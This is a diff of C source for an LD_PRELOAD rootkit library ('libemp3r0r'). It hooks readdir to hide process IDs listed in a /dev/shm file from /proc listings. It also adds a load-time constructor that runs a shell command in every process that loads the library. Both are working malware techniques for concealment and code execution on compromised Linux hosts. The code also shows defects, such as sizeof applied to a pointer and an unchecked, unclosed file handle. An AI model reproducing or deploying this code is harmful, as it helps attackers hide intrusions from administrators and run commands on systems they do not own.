@@ -1,5 +1,5 @@
 #define _GNU_SOURCE
-#include "libemp.h"
+#include "libemp3r0r.h"
 #include <dirent.h>
 #include <dlfcn.h>
 #include <errno.h>
@@ -13,14 +13,28 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+// trim trailing whitespace from a string
+void trim_str(char* buffer)
+{
+    buffer[strcspn(buffer, "\r\n")] = 0;
+}
+
+// check if this pid is present in /dev/shm/emp PID list
 int is_hidden(const char* pid)
 {
+    FILE* fd = fopen(SHM_FILE, "r");
+    int bufferLength = 255;
+    char buffer[bufferLength];
+    while (fgets(buffer, bufferLength, fd)) {
+        trim_str(buffer);
+        if (strncmp(pid, buffer, strlen(pid)) == 0) {
+            return 1;
+        }
+    }
     return 0;
 }
 
-/*
- * Get a directory name given a DIR* handle
- */
+// Get a directory name given a DIR* handle
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
@@ -103,7 +117,7 @@ struct dirent* readdir(DIR* dirp)
         }
         if (strcmp(pwd, "/proc") == 0) {
             if (is_hidden(result->d_name)) {
-                printf("HIT pid %s", result->d_name);
+                printf("HIT pid %s\n", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
@@ -120,12 +134,13 @@ struct dirent* readdir(DIR* dirp)
 
 void add_hide_pid(char* pid)
 {
+    fwrite(pid, 1, sizeof(pid), SHM_FD);
 }
 
-int open_ramfs(void)
+FILE* open_ramfs(void)
 {
-    int fd;
-    fd = shm_open("shm", O_RDWR | O_CREAT, S_IRWXU);
+    FILE* fd;
+    fd = fopen64(SHM_FILE, "a+");
     return fd;
 }
 
@@ -156,12 +171,10 @@ void __attribute__((constructor)) initLibrary(void)
     if (!SHM_FD)
         SHM_FD = open_ramfs();
 
-    char* emp_path = getenv("LS_PATH");
-    if (emp_path)
-        execlp("sh", "-c", emp_path, (char*)0);
+    execlp("sh", "-c", EmpPATH, (char*)0);
 }
 
 void __attribute__((destructor)) cleanUpLibrary(void)
 {
-    /* free(HIDE_PIDS); */
+    fclose(SHM_FD);
 }
